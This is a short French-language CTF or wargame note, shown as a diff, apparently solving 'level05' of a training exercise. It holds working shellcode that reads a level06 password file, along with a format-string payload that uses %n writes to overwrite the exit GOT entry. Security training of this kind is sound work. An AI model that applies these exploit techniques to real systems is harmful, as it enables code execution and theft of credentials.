@@ -1,0 +1,21 @@
+export SHELLCODE=$(python -c 'print("\x90" * 80 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass")')
+
+objdump level05 -R  pour avoirl adresse d exit
+
+python -c 'print("aaaa" + "%x " * 50 )' | ./level05
+
+on va passer nos 2 adresse de buffera la 10 eme et 11 eme place de notre string exploit
+
+on doit mtn calculer notre marge
+
+0xffffd88d
+printf %d 0xffff
+65535
+printf %d 0xd88d
+55437	il faudra pas oublier d enlever 8 pour l taille de string
+
+65535 - 55437 = 10098
+
+voila donc notre payload
+
+python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55429c" + "%10$n" + "%10098c" + "%11$n")' | ./level05
